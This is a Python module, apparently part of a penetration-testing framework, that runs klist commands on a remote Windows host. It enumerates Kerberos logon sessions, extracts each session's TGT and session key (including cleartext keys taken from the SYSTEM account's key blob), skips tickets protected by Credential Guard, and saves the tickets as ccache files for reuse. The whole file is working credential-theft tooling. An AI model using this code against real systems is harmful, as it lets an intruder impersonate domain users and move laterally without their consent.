import contextlib
import os
import re
import struct
from datetime import datetime, UTC

from impacket.krb5 import constants, types
from impacket.krb5.ccache import CCache, Credential, Principal, KeyBlockV4, Times, CountedOctetString, Header


SESSION_LINE = re.compile(r"\[\d+\]\s+Session\s+\d+\s+0:(0x[0-9a-fA-F]+)\s+(.+?)\s+(\S+:\S+)\s*$")

# Kerberos key sizes (RFC 4120 + Windows etypes)
KEY_SIZES = {0x01: 8, 0x03: 8, 0x11: 16, 0x12: 32, 0x17: 16, 0x18: 16}

MACHINE_LOGON_IDS = {"0x3e7", "0x3e4"}


def parse_klist_sessions(text):
    """Keep only sessions that can hold a usable TGT: Kerberos logons other than
    network ones (interactive, service, batch...) and the machine account's own
    sessions (SYSTEM, NETWORK SERVICE). DWM and other GUI pseudo-accounts are
    Negotiate:Interactive, so requiring the Kerberos prefix drops them. Network
    logons never cache a TGT, so they are the only Kerberos type dropped.
    """
    sessions = []
    seen = set()
    for line in text.splitlines():
        line = line.strip()
        match = SESSION_LINE.search(line)
        if not match:
            continue
        logon_hex = match.group(1).strip()
        account = match.group(2).strip()
        session_type = match.group(3).strip()
        if not logon_hex or not account:
            continue
        kerberos = session_type.startswith("Kerberos:") and session_type != "Kerberos:Network"
        machine = logon_hex.lower() in MACHINE_LOGON_IDS
        if not (kerberos or machine):
            continue
        if logon_hex in seen:
            continue
        seen.add(logon_hex)
        sessions.append((logon_hex, account))
    return sessions


def select_sessions(sessions, selection):
    if not selection:
        return sessions, None
    try:
        indices = [int(num) for num in selection]
    except ValueError:
        return None, "session numbers must be integers (see --klist)"
    out_of_range = [i for i in indices if i < 1 or i > len(sessions)]
    if out_of_range:
        nums = ", ".join(str(i) for i in out_of_range)
        return None, f"session number(s) out of range (1-{len(sessions)}): {nums}"
    return [sessions[i - 1] for i in indices], None


def get_target_utc_bias(run_cmd, logger):
    """Minutes to add to the target's local time to get UTC (UTC = local + ActiveTimeBias).
    klist prints local wallclock with no zone, so without this the ccache times and the
    expiry check are off by the target's UTC offset whenever it differs from ours.
    """
    output = run_cmd(r'reg query "HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation" /v ActiveTimeBias')
    match = re.search(r"ActiveTimeBias\s+REG_DWORD\s+0x([0-9a-fA-F]+)", output) if output else None
    if not match:
        logger.debug("Could not read ActiveTimeBias, assuming target is in UTC")
        return 0
    value = int(match.group(1), 16)
    if value >= 0x80000000:  # DWORD two's complement: east-of-UTC biases are negative
        value -= 0x100000000
    return value


def collect_tgts(sessions, run_cmd, logger):
    bias_minutes = get_target_utc_bias(run_cmd, logger)
    now = datetime.now(UTC).timestamp()
    tgts = []
    for logon_hex, account in sessions:
        tgt_text = run_cmd(f"klist tgt -li {logon_hex}")
        if not tgt_text:
            logger.debug(f"{account} ({logon_hex}): no output from klist tgt")
            continue
        info = parse_klist(tgt_text, bias_minutes)
        if not info["ticket_data"]:
            logger.debug(f"{account} ({logon_hex}): no TGT in cache")
            continue
        if info["cred_guard"]:
            logger.fail(f"{account} ({logon_hex}): Credential Guard-protected (VTL1)")
            continue
        end_time = info["end_time"]
        renew_till = info["renew_till"]
        if end_time and end_time < now:
            if not (renew_till and renew_till > now):
                logger.fail(f"{account} ({logon_hex}): expired, skipping")
                continue
            logger.debug(f"{account} ({logon_hex}): expired but still renewable")
        tgts.append((logon_hex, account, info))
    return tgts


def parse_klist(text, bias_minutes=0):

    def field(pattern, default=""):
        match = re.search(pattern, text, re.IGNORECASE)
        return match.group(1).strip() if match else default

    def parse_time(time_str):
        if not time_str:
            return 0
        for time_format in ("%m/%d/%Y %H:%M:%S", "%m/%d/%Y %H:%M"):
            with contextlib.suppress(ValueError):
                local = int(datetime.strptime(time_str.strip(), time_format).replace(tzinfo=UTC).timestamp())
                return local + bias_minutes * 60  # local wallclock -> true UTC epoch
        return 0

    ticket_hex = [re.sub(r"[^0-9a-fA-F]", "", match.group(1)) for match in re.finditer(r"^[0-9a-fA-F]{4}\s+((?:[0-9a-fA-F]{2}[\s:])+)", text, re.MULTILINE)]
    ticket_bytes = bytes.fromhex("".join(ticket_hex)) if ticket_hex else b""

    key_type = int(field(r"KeyType\s+(0x[0-9a-fA-F]+)", "0x12"), 16)

    key_hex = re.sub(r"\s+", "", field(r"KeyLength\s+\d+\s+-\s+([0-9a-fA-F][0-9a-fA-F ]*)"))
    try:
        key_blob = bytes.fromhex(key_hex) if key_hex else b""
    except ValueError:
        key_blob = b""

    cred_guard = False
    key_bytes = b""
    if key_blob:
        # SYSTEM key field is a marshalled KerberosKeyWithMetadata blob, not a raw key.
        if len(key_blob) >= 16 and struct.unpack_from("<I", key_blob, 0)[0] == len(key_blob):  # self-size@0
            type_name = b"KerberosKeyWithMetadata"
            type_name_len = struct.unpack_from("<I", key_blob, 8)[0]      # type-name length@8
            type_name_offset = struct.unpack_from("<I", key_blob, 12)[0]  # type-name offset@12
            cred_guard = (
                type_name_len == len(type_name)
                and 0 < type_name_offset <= len(key_blob) - len(type_name)
                and key_blob[type_name_offset:type_name_offset + len(type_name)] == type_name
            )
            if not cred_guard:  # not Credential Guard: offset 8 is the etype, key is cleartext@28
                blob_etype = struct.unpack_from("<I", key_blob, 8)[0]
                key_size = KEY_SIZES.get(blob_etype)
                if key_size and len(key_blob) >= 28 + key_size:
                    key_type = blob_etype
                    key_bytes = key_blob[28:28 + key_size]
        if not key_bytes:
            expected_size = KEY_SIZES.get(key_type, 32)
            if len(key_blob) == expected_size:
                key_bytes = key_blob

    if not key_bytes:
        expected_size = KEY_SIZES.get(key_type, 32)
        key_bytes = b"\x00" * expected_size

    return {
        "client": field(r"ClientName\s*:\s*(.+)"),
        "realm": field(r"DomainName\s*:\s*(.+)"),
        "sname": [field(r"ServiceName\s*:\s*(.+)"), field(r"TargetDomainName\s*:\s*(.+)")],
        "flags": int(field(r"Ticket Flags\s*:\s*(0x[0-9a-fA-F]+)", "0x0"), 16),
        "key_type": key_type,
        "key_data": key_bytes,
        "cred_guard": cred_guard,
        "auth_time": parse_time(field(r"StartTime\s*:\s*(.+?)\s*\(local\)")),
        "start_time": parse_time(field(r"StartTime\s*:\s*(.+?)\s*\(local\)")),
        "end_time": parse_time(field(r"EndTime\s*:\s*(.+?)\s*\(local\)")),
        "renew_till": parse_time(field(r"RenewUntil\s*:\s*(.+?)\s*\(local\)")),
        "ticket_data": ticket_bytes,
    }


def build_principal(components, realm):
    source = types.Principal([components, realm], type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    principal = Principal()
    principal.fromPrincipal(source)
    return principal


def write_ccache(info, path):
    ccache = CCache()

    header = Header()
    header["tag"] = 1
    header["taglen"] = 8
    header["tagdata"] = b"\xff\xff\xff\xff\x00\x00\x00\x00"
    ccache.headers = [header]

    ccache.principal = build_principal([info["client"]], info["realm"])

    credential = Credential()
    credential["client"] = ccache.principal
    credential["server"] = build_principal(info["sname"], info["realm"])
    credential["is_skey"] = 0
    credential["tktflags"] = info["flags"]
    credential["num_address"] = 0

    credential["key"] = KeyBlockV4()
    credential["key"]["keytype"] = info["key_type"]
    credential["key"]["keyvalue"] = info["key_data"]
    credential["key"]["keylen"] = len(info["key_data"])

    credential["time"] = Times()
    credential["time"]["authtime"] = info["auth_time"]
    credential["time"]["starttime"] = info["start_time"]
    credential["time"]["endtime"] = info["end_time"]
    credential["time"]["renew_till"] = info["renew_till"]

    credential.ticket = CountedOctetString()
    credential.ticket["data"] = info["ticket_data"]
    credential.ticket["length"] = len(info["ticket_data"])
    credential.secondTicket = CountedOctetString()
    credential.secondTicket["data"] = b""
    credential.secondTicket["length"] = 0

    ccache.credentials = [credential]
    ccache.saveFile(path)
    return path


def fmt_ticket_time(timestamp):
    if not timestamp:
        return "N/A"
    return datetime.fromtimestamp(timestamp, tz=UTC).strftime("%Y-%m-%d %H:%M:%S")


def ccache_path(prefix, client, realm, logon_hex):
    safe_name = re.sub(r"[^\w@.-]", "_", f"{client}@{realm}_{logon_hex}")
    return f"{prefix}_{safe_name}.ccache"


def klist_display(conn):
    output = conn.execute("klist sessions", True)
    if not output:
        conn.logger.fail("Failed to enumerate Kerberos sessions")
        return
    sessions = parse_klist_sessions(output)
    tgts = collect_tgts(sessions, lambda cmd: conn.execute(cmd, True), conn.logger)
    if not tgts:
        conn.logger.fail("No Kerberos TGTs found")
        return
    conn.logger.success(f"Found {len(tgts)} TGT(s)")
    width = max(len(account) for _, account, _ in tgts)
    for i, (logon_hex, account, info) in enumerate(tgts, 1):
        conn.logger.highlight(f"  [{i}] {account:<{width}}  {logon_hex}  (expires {fmt_ticket_time(info['end_time'])} UTC)")


def klist_dump_ccaches(conn, selection):
    output = conn.execute("klist sessions", True)
    if not output:
        conn.logger.fail("Failed to enumerate Kerberos sessions")
        return
    sessions = parse_klist_sessions(output)
    tgts = collect_tgts(sessions, lambda cmd: conn.execute(cmd, True), conn.logger)
    tgts, error = select_sessions(tgts, selection)
    if error:
        conn.logger.fail(error)
        return
    if not tgts:
        conn.logger.fail("No valid TGTs dumped")
        return

    output_prefix = conn.output_file_template.format(output_folder="klist")
    os.makedirs(os.path.dirname(output_prefix), exist_ok=True)

    written = []
    for logon_hex, account, info in tgts:
        path = ccache_path(output_prefix, info["client"], info["realm"], logon_hex)
        write_ccache(info, path)
        written.append(path)
        conn.logger.highlight(f"{account}  (expires {fmt_ticket_time(info['end_time'])} UTC)")
    conn.logger.success(f"Dumped {len(written)} TGT(s) to {os.path.dirname(output_prefix)}")
